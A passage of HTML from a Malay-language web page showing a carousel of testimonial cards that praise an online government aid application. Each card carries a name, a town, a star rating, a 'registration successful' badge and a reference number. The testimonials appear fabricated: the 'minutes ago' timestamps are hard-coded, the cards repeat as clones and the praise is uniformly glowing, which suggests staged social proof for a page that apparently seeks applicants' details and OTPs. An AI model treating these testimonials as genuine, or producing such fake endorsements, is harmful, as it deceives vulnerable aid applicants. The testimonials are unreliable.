                                    <div class="tc-av" style="background:linear-gradient(135deg,#b45309,#f59e0b);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Rosnah bt Ismail</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Alor Setar, Kedah<span
                                            class="dot"></span>20 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-201847</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Mudah sangat nak mohon. Saya yang tak berapa mahir teknologi pun
                                        boleh buat sendiri tanpa bantuan. Sangat kagum!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#be123c,#f43f5e);">M
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Mohd Hafiz Abdurrahman</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ipoh, Perak<span
                                            class="dot"></span>28 min lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-674920</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses ringkas dan jelas. Setiap langkah mudah difahami. Tahniah
                                        kepada pasukan IT yang membangunkan sistem ini!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0f766e,#2dd4bf);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Normala bt Jusoh</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuala Terengganu<span
                                            class="dot"></span>35 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-519374</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sistem yang lancar tanpa sebarang masalah teknikal langsung.
                                        Puas hati sepenuhnya. Terima kasih banyak-banyak!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#4338ca,#818cf8);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Shahrul Azlan Saad</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Melaka Tengah<span
                                            class="dot"></span>42 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-863102</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dah kongsikan kepada semua rakan-rakan. Semua pun berjaya
                                        mendaftar. Sistem terbaik yang pernah saya guna!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#9a3412,#fb923c);">F
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Fauziah bt Latif</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuantan, Pahang<span
                                            class="dot"></span>50 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-437281</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Permohonan sempurna. Proses pantas, tiada gangguan, tiada
                                        masalah teknikal sama sekali. Sangat berpuas hati!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1d4ed8,#60a5fa);">K
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Khairul Nizam Daud</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kota Kinabalu, Sabah<span
                                            class="dot"></span>1 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-728456</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dari Sabah pun boleh mohon dengan mudah dan lancar. Sistem dalam
                                        talian ini memang terbaik untuk seluruh rakyat!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1a3c8f,#2952c4);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Azura bt Hamid</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuching, Sarawak<span
                                            class="dot"></span>1 j 10 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-915637</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Walaupun tinggal jauh di Sarawak, langsung tiada masalah. Terima
                                        kasih atas kemudahan yang luar biasa ini!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#7c3aed,#a855f7);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Roslan Abu Bakar</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Seremban, N. Sembilan<span
                                            class="dot"></span>2 jam lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-342098</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Permohonan diterima dengan segera. Saya amat menghargai usaha
                                        kerajaan dalam memudahkan urusan rakyat jelata.</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0891b2,#0ea5e9);">Z
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Zulaikha Mazlan</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Shah Alam<span
                                            class="dot"></span>2 j 15 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-119283</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses yang sangat telus dan mudah difahami. Bukti bahawa
                                        kerajaan serius menjaga kebajikan golongan berpendapatan rendah.</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#059669,#34d399);">H
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Hafizuddin Ahmad</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Subang Jaya<span
                                            class="dot"></span>2 j 40 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-664738</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya dah cuba beberapa kali sebelum ini. Kali ini berjaya dengan
                                        mudah sekali. Terima kasih atas penambahbaikan sistem!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#b45309,#f59e0b);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Suraya bt Kassim</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ampang, Selangor<span
                                            class="dot"></span>3 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-502917</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sistem yang sangat baik dan tidak mengelirukan. Setiap langkah
                                        dijelaskan dengan sangat jelas. Terima kasih!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#be123c,#f43f5e);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Ridhwan Bakar</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Pelabuhan Klang<span
                                            class="dot"></span>3 j 20 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-783412</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Cepat, mudah dan selamat. Hanya ambil masa 7 minit dari mula
                                        hingga selesai. Sangat menggalakkan untuk rakyat!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0f766e,#2dd4bf);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Norhayati bt Jamil</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ipoh, Perak<span
                                            class="dot"></span>4 jam lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-291056</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sangat berbaloi dengan tunggu. Sistem lancar, borang ringkas.
                                        Semoga permohonan saya diluluskan. Amin.</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#4338ca,#818cf8);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Azman Razali</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Seremban<span
                                            class="dot"></span>4 j 30 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-847362</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Alhamdulillah! Dapat daftar untuk keluarga. Terima kasih kepada
                                        semua yang terlibat dalam menjayakan sistem ini.</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#9a3412,#fb923c);">F
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Fatimah bt Salleh</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Alor Setar, Kedah<span
                                            class="dot"></span>5 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-623741</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya sangat terharu. Impian memiliki rumah sendiri kini semakin
                                        hampir. Terima kasih kerajaan Malaysia!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1d4ed8,#60a5fa);">Y
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Yazid Hassan</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kota Kinabalu<span
                                            class="dot"></span>5 j 10 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-934815</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses yang cepat dan mudah. Tahniah kepada seluruh pasukan yang
                                        membangunkan sistem yang hebat ini!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1a3c8f,#2952c4);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Siti Aminah bt Hassan</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuala Lumpur<span
                                            class="dot"></span>2 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-841027</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Alhamdulillah! Proses permohonan sangat mudah dan lancar. Dalam
                                        masa 5 minit sahaja dah selesai. Syabas kerajaan!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#7c3aed,#a855f7);">M
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Mohd Firdaus Halim</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Shah Alam, Selangor<span
                                            class="dot"></span>6 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-623918</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya rasa sangat berpuas hati dengan sistem baru ini. Tak perlu
                                        beratur atau datang ke pejabat. Bagus sangat!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0891b2,#0ea5e9);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Nurul Ain Zakaria</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Johor Bahru<span
                                            class="dot"></span>11 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-752341</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dah lama saya tunggu peluang ini. Akhirnya dapat daftar dengan
                                        mudah. Terima kasih kerajaan Malaysia!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#059669,#34d399);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Ahmad Zaki Roslan</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Pulau Pinang<span
                                            class="dot"></span>15 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-398564</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">OTP masuk dalam beberapa saat sahaja. Proses terus berjalan
                                        lancar. Sistem yang sangat canggih dan berkesan!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#b45309,#f59e0b);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Rosnah bt Ismail</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Alor Setar, Kedah<span
                                            class="dot"></span>20 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-201847</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Mudah sangat nak mohon. Saya yang tak berapa mahir teknologi pun
                                        boleh buat sendiri tanpa bantuan. Sangat kagum!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#be123c,#f43f5e);">M
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Mohd Hafiz Abdurrahman</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ipoh, Perak<span
                                            class="dot"></span>28 min lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-674920</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses ringkas dan jelas. Setiap langkah mudah difahami. Tahniah
                                        kepada pasukan IT yang membangunkan sistem ini!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0f766e,#2dd4bf);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Normala bt Jusoh</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuala Terengganu<span
                                            class="dot"></span>35 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-519374</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sistem yang lancar tanpa sebarang masalah teknikal langsung.
                                        Puas hati sepenuhnya. Terima kasih banyak-banyak!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#4338ca,#818cf8);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Shahrul Azlan Saad</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Melaka Tengah<span
                                            class="dot"></span>42 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-863102</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dah kongsikan kepada semua rakan-rakan. Semua pun berjaya
                                        mendaftar. Sistem terbaik yang pernah saya guna!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#9a3412,#fb923c);">F
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Fauziah bt Latif</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuantan, Pahang<span
                                            class="dot"></span>50 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-437281</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Permohonan sempurna. Proses pantas, tiada gangguan, tiada
                                        masalah teknikal sama sekali. Sangat berpuas hati!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1d4ed8,#60a5fa);">K
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Khairul Nizam Daud</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kota Kinabalu, Sabah<span
                                            class="dot"></span>1 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-728456</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dari Sabah pun boleh mohon dengan mudah dan lancar. Sistem dalam
                                        talian ini memang terbaik untuk seluruh rakyat!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1a3c8f,#2952c4);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Azura bt Hamid</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuching, Sarawak<span
                                            class="dot"></span>1 j 10 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-915637</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Walaupun tinggal jauh di Sarawak, langsung tiada masalah. Terima
                                        kasih atas kemudahan yang luar biasa ini!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#7c3aed,#a855f7);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Roslan Abu Bakar</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Seremban, N. Sembilan<span
                                            class="dot"></span>2 jam lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-342098</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Permohonan diterima dengan segera. Saya amat menghargai usaha
                                        kerajaan dalam memudahkan urusan rakyat jelata.</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0891b2,#0ea5e9);">Z
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Zulaikha Mazlan</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Shah Alam<span
                                            class="dot"></span>2 j 15 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-119283</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses yang sangat telus dan mudah difahami. Bukti bahawa
